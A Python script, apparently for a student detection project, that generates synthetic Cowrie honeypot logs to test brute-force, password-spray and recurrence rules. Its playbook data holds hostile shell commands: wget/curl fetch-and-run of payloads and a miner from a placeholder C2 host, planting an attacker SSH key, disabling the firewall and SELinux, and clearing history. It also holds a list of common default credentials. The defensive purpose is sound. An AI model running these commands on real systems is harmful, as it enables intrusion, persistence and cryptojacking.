"""
Gerador de logs sinteticos no formato do Cowrie.

Por que isso existe:
    O honeypot real so entra no passo 5 do projeto. Sem este gerador, voce
    ficaria travado esperando VPS antes de escrever qualquer coisa. Aqui os
    eventos saem no MESMO formato JSON que o Cowrie produz, entao todo o
    pipeline, as regras e o dashboard sao desenvolvidos e testados agora.
    Na hora de ligar o honeypot de verdade, nada no codigo muda.

Uso:
    python gerar_logs.py --sessoes 500 --saida ../dados/cowrie.json

    python gerar_logs.py --sessoes 2000 --dias 7 --seed 42

Nao precisa de nenhuma biblioteca externa - so a stdlib do Python.
"""

import argparse
import hashlib
import ipaddress
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
#  Dados de referencia
#
#  Nao sao inventados: sao os pares de credencial e os padroes de comando que
#  aparecem de verdade em honeypots publicos. A distribuicao tambem imita a
#  realidade - poucas senhas concentram quase todas as tentativas.
# ---------------------------------------------------------------------------

# (usuario, senha, peso). Peso alto = mais tentado pelos bots.
CREDENCIAIS = [
    ("root", "123456", 180), ("root", "root", 150), ("root", "", 120),
    ("root", "admin", 95), ("root", "password", 90), ("admin", "admin", 85),
    ("root", "1234", 70), ("root", "12345", 65), ("admin", "1234", 55),
    ("root", "toor", 50), ("user", "user", 40), ("root", "qwerty", 38),
    ("admin", "password", 35), ("test", "test", 30), ("oracle", "oracle", 25),
    ("ubuntu", "ubuntu", 24), ("pi", "raspberry", 22), ("root", "123123", 20),
    ("postgres", "postgres", 18), ("git", "git", 15), ("ftp", "ftp", 12),
    ("mysql", "mysql", 12), ("guest", "guest", 10), ("root", "P@ssw0rd", 9),
    ("support", "support", 8), ("nagios", "nagios", 6), ("deploy", "deploy", 5),
]

# Banners de cliente SSH. libssh e Go costumam ser bot; PuTTY sugere humano.
CLIENTES = [
    ("SSH-2.0-libssh_0.9.6", 40), ("SSH-2.0-libssh2_1.9.0", 25),
    ("SSH-2.0-Go", 20), ("SSH-2.0-PUTTY", 8),
    ("SSH-2.0-OpenSSH_7.4", 7), ("SSH-2.0-paramiko_2.11.0", 5),
]

# Playbooks: o que o bot roda achando que invadiu de verdade.
PLAYBOOKS = [
    # Reconhecimento simples - so mede a maquina e vai embora.
    ["uname -a", "whoami", "cat /proc/cpuinfo | grep name | wc -l",
     "free -m | grep Mem", "ls -lh /var/log"],

    # Botnet de IoT: baixa binario, roda, apaga o rastro.
    ["cd /tmp", "wget http://{ip_c2}/bins.sh", "chmod 777 bins.sh",
     "sh bins.sh", "rm -rf bins.sh", "history -c"],

    # Cryptominer.
    ["uname -m", "nproc", "curl -s http://{ip_c2}/xmrig.tar.gz -o /tmp/x.tar.gz",
     "tar xzf /tmp/x.tar.gz -C /tmp", "/tmp/xmrig -o pool.minexmr.com:4444 -B"],

    # Persistencia via chave SSH - o mais grave.
    ["mkdir -p ~/.ssh",
     "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQ attacker@evil' >> ~/.ssh/authorized_keys",
     "chmod 600 ~/.ssh/authorized_keys", "service sshd restart"],

    # Desativa defesa antes de agir.
    ["systemctl stop firewalld", "iptables -F", "setenforce 0",
     "cd /tmp", "wget http://{ip_c2}/payload", "chmod +x payload", "./payload"],

    # Sessao curta: so confirma que a credencial funciona e sai.
    ["uname -s -v -n -r -m"],
]

PAISES = [("CN", 22), ("US", 15), ("RU", 12), ("IN", 9), ("BR", 8),
          ("DE", 7), ("NL", 6), ("VN", 6), ("KR", 5), ("FR", 4),
          ("GB", 3), ("SG", 3)]

# Usuarios distintos que aparecem no dicionario acima. O atacante de spray
# percorre esta lista com UMA senha fixa - padrao inverso da forca bruta.
USUARIOS = sorted({u for u, _, _ in CREDENCIAIS})

# Senhas tipicas de spray: comuns o bastante para valer contra muitas contas.
SENHAS_SPRAY = ["123456", "password", "admin", "1234", "P@ssw0rd", "welcome"]


def escolher(pares, rnd):
    """Sorteio ponderado. `pares` e uma lista de (valor, peso)."""
    valores = [p[0] if len(p) == 2 else p[:-1] for p in pares]
    pesos = [p[-1] for p in pares]
    return rnd.choices(valores, weights=pesos, k=1)[0]


def gerar_ip(rnd):
    """IP publico plausivel, evitando faixas privadas e reservadas."""
    while True:
        end = ipaddress.IPv4Address(rnd.randint(1 << 24, (1 << 32) - 1))
        if end.is_global and not end.is_multicast:
            return str(end)


def sha256_falso(rnd):
    semente = str(rnd.random()).encode()
    return hashlib.sha256(semente).hexdigest()


def montar_atacantes(rnd, n_sessoes):
    """
    Monta o elenco de atacantes.

    Detalhe que importa: na vida real o trafego NAO se distribui por IPs
    unicos. Uma minoria de hosts insiste dezenas de vezes (botnet com alvo
    fixo) enquanto a maioria aparece uma vez so (varredura oportunista).

    Sem isso, cada sessao sai de um IP diferente e as regras REINCIDENTE e
    HORARIO_REGULAR nunca teriam o que detectar.

    Cada atacante carrega pais e cliente FIXOS - o mesmo host nao muda de
    pais entre uma sessao e outra.
    """
    persistentes = max(3, n_sessoes // 25)   # ~4% do volume em hosts teimosos
    ocasionais = max(1, int(n_sessoes * 0.55))
    spray = max(2, n_sessoes // 200)

    elenco = []
    for _ in range(persistentes):
        cadencia = rnd.choice([30, 60, 120, 240]) if rnd.random() < 0.33 else None
        elenco.append({
            "ip": gerar_ip(rnd),
            "pais": escolher(PAISES, rnd),
            "cliente": escolher(CLIENTES, rnd),
            # Peso 0 para quem tem cadencia: o sorteio aleatorio NAO pode
            # incluir esse host, senao suas sessoes extras caem em horarios
            # irregulares e destroem a assinatura de cron. Foi exatamente o
            # que fez a regra HORARIO_REGULAR nao disparar (CV 0.55 medido,
            # limiar 0.15). Quem tem cadencia so aparece pela cadencia.
            "peso": 0 if cadencia else rnd.randint(15, 60),
            "cadencia_min": cadencia,
            "modo": "normal",
        })

    # Atacante de spray: uma senha fixa contra a lista inteira de usuarios.
    # Sem ele a regra PASSWORD_SPRAY nao tem o que detectar - o melhor caso
    # medido no dicionario normal era 2 usuarios por senha, contra limiar 10.
    for _ in range(spray):
        elenco.append({
            "ip": gerar_ip(rnd),
            "pais": escolher(PAISES, rnd),
            "cliente": escolher(CLIENTES, rnd),
            "peso": rnd.randint(8, 20),
            "cadencia_min": None,
            "modo": "spray",
            "senha_fixa": rnd.choice(SENHAS_SPRAY),
        })

    for _ in range(ocasionais):
        elenco.append({
            "ip": gerar_ip(rnd),
            "pais": escolher(PAISES, rnd),
            "cliente": escolher(CLIENTES, rnd),
            "peso": 1,                            # aparece uma vez e some
            "cadencia_min": None,
            "modo": "normal",
        })
    return elenco


def gerar_sessao(rnd, inicio, contador, atacante, run_id):
    """
    Produz a lista de eventos JSON de UMA sessao, na ordem cronologica.

    Cada evento imita o formato real do Cowrie: campos eventid, session,
    src_ip e timestamp em todos, mais os campos especificos de cada tipo.

    O `run_id` prefixa o identificador da sessao. Sem ele, duas execucoes do
    gerador produziriam as mesmas ids (00000001, 00000002...) e a ingestao
    penduraria as tentativas novas nas sessoes antigas via ON CONFLICT -
    corrupcao silenciosa. O Cowrie real emite id unico por sessao; o gerador
    precisa fazer o mesmo. Derivado do rnd, entao --seed continua reprodutivel.
    """
    eventos = []
    sessao_id = f"{run_id}{contador:06x}"
    src_ip = atacante["ip"]
    pais = atacante["pais"]
    cliente = atacante["cliente"]
    protocolo = "telnet" if rnd.random() < 0.15 else "ssh"
    porta = 23 if protocolo == "telnet" else 22
    agora = inicio

    def ts(dt):
        return dt.astimezone(timezone.utc).isoformat().replace("+00:00", "Z")

    base = {"session": sessao_id, "src_ip": src_ip, "sensor": "honeypot-udi-01"}

    eventos.append({**base, "eventid": "cowrie.session.connect",
                    "timestamp": ts(agora), "src_port": rnd.randint(30000, 65000),
                    "dst_port": porta, "dst_ip": "10.0.0.5",
                    "protocol": protocolo, "pais_simulado": pais})

    eventos.append({**base, "eventid": "cowrie.client.version",
                    "timestamp": ts(agora), "version": cliente})

    eh_spray = atacante.get("modo") == "spray"

    if eh_spray:
        # Spray: percorre MUITOS usuarios com UMA senha. Poucas tentativas por
        # conta, para nao estourar bloqueio - por isso a regra de forca bruta
        # (que conta falhas por IP numa janela curta) costuma deixar passar.
        alvos = rnd.sample(USUARIOS, k=min(len(USUARIOS), rnd.randint(12, 15)))
        credenciais_sessao = [(u, atacante["senha_fixa"]) for u in alvos]
    else:
        # Quantas tentativas de login. A cauda longa (ate 60) e o que faz a
        # regra de forca bruta ter o que detectar.
        n_tentativas = rnd.choices([1, 2, 3, 5, 12, 28, 60],
                                   weights=[30, 22, 16, 12, 10, 6, 4], k=1)[0]
        credenciais_sessao = [escolher(CREDENCIAIS, rnd) for _ in range(n_tentativas)]

    # ~2% das sessoes "autenticam". No Cowrie o login e sempre simulado.
    # Spray nunca autentica: o objetivo dele e mapear contas, nao entrar.
    autentica = (not eh_spray) and rnd.random() < 0.02

    for i, (usuario, senha) in enumerate(credenciais_sessao):
        agora += timedelta(milliseconds=rnd.randint(120, 2500))
        ultima = (i == len(credenciais_sessao) - 1)
        sucesso = autentica and ultima
        eventos.append({
            **base,
            "eventid": "cowrie.login.success" if sucesso else "cowrie.login.failed",
            "timestamp": ts(agora), "username": usuario, "password": senha,
        })

    if autentica:
        # Bot age em milissegundos; a latencia baixa e justamente o sinal.
        playbook = rnd.choice(PLAYBOOKS)
        ip_c2 = gerar_ip(rnd)
        for cmd in playbook:
            agora += timedelta(milliseconds=rnd.randint(80, 900))
            texto = cmd.format(ip_c2=ip_c2)
            eventos.append({**base, "eventid": "cowrie.command.input",
                            "timestamp": ts(agora), "input": texto})

            if any(t in texto for t in ("wget ", "curl ", "tftp ")):
                agora += timedelta(milliseconds=rnd.randint(200, 3000))
                eventos.append({
                    **base, "eventid": "cowrie.session.file_download",
                    "timestamp": ts(agora),
                    "url": f"http://{ip_c2}/{texto.split('/')[-1].split()[0]}",
                    "shasum": sha256_falso(rnd),
                    "outfile": "var/lib/cowrie/downloads/" + sha256_falso(rnd),
                    "size": rnd.randint(1024, 4_500_000),
                })

    agora += timedelta(milliseconds=rnd.randint(100, 5000))
    eventos.append({**base, "eventid": "cowrie.session.closed",
                    "timestamp": ts(agora),
                    "duration": round((agora - inicio).total_seconds(), 3)})
    return eventos


def main():
    ap = argparse.ArgumentParser(description="Gera logs sinteticos do Cowrie.")
    ap.add_argument("--sessoes", type=int, default=500,
                    help="quantas sessoes gerar (padrao: 500)")
    ap.add_argument("--dias", type=int, default=7,
                    help="espalhar as sessoes nos ultimos N dias (padrao: 7)")
    ap.add_argument("--saida", default="../dados/cowrie.json",
                    help="arquivo de saida")
    ap.add_argument("--seed", type=int, default=None,
                    help="semente aleatoria - use pra gerar sempre o mesmo dado")
    args = ap.parse_args()

    rnd = random.Random(args.seed)
    fim = datetime.now(timezone.utc)
    comeco = fim - timedelta(days=args.dias)
    span = (fim - comeco).total_seconds()

    # Prefixo desta execucao, para as ids de sessao nao colidirem entre runs.
    # Vem do rnd, logo --seed igual => run_id igual => saida identica.
    run_id = f"{rnd.randrange(16 ** 6):06x}"

    elenco = montar_atacantes(rnd, args.sessoes)
    pesos = [a["peso"] for a in elenco]

    # Monta os pares (momento, atacante). Quem tem cadencia fixa recebe
    # horarios espacados regularmente; o resto cai em instante aleatorio.
    #
    # Duas travas aqui, ambas aprendidas na marra:
    #
    #  1. JANELA DE ATIVIDADE. O bot com cron nao ataca o periodo inteiro -
    #     fica ativo alguns dias e some (host derrubado, alvo trocado). Sem
    #     essa trava, um bot de cadencia 30min sobre 14 dias gera 672 sessoes
    #     sozinho e engole o dataset.
    #  2. ORCAMENTO GLOBAL. No maximo 20% das sessoes vem de cadencia fixa,
    #     senao os atacantes ocasionais nunca aparecem.
    agenda = []
    orcamento_cadencia = int(args.sessoes * 0.20)

    for a in elenco:
        if not a["cadencia_min"] or len(agenda) >= orcamento_cadencia:
            continue
        janela_h = rnd.uniform(12, min(72, args.dias * 24))
        ativo_de = comeco + timedelta(
            seconds=rnd.uniform(0, max(1, span - janela_h * 3600)))
        ativo_ate = min(fim, ativo_de + timedelta(hours=janela_h))

        passo = timedelta(minutes=a["cadencia_min"])
        t = ativo_de
        while t < ativo_ate and len(agenda) < orcamento_cadencia:
            # jitter pequeno: nem cron e perfeito, mas o padrao segue visivel
            agenda.append((t + timedelta(seconds=rnd.uniform(-20, 20)), a))
            t += passo

    while len(agenda) < args.sessoes:
        atacante = rnd.choices(elenco, weights=pesos, k=1)[0]
        agenda.append((comeco + timedelta(seconds=rnd.uniform(0, span)), atacante))

    agenda = sorted(agenda[:args.sessoes], key=lambda par: par[0])

    caminho = Path(args.saida)
    caminho.parent.mkdir(parents=True, exist_ok=True)

    n_eventos = 0
    vistos = {}
    with caminho.open("w", encoding="utf-8") as f:
        for i, (momento, atacante) in enumerate(agenda, start=1):
            vistos[atacante["ip"]] = vistos.get(atacante["ip"], 0) + 1
            for ev in gerar_sessao(rnd, momento, i, atacante, run_id):
                f.write(json.dumps(ev, ensure_ascii=False) + "\n")
                n_eventos += 1

    reincidentes = sum(1 for n in vistos.values() if n >= 5)
    print(f"OK  {args.sessoes} sessoes -> {n_eventos} eventos")
    print(f"    arquivo: {caminho.resolve()}")
    print(f"    periodo: {comeco:%d/%m/%Y} ate {fim:%d/%m/%Y}")
    print(f"    IPs distintos: {len(vistos)}  |  com 5+ sessoes: {reincidentes}")


if __name__ == "__main__":
    main()
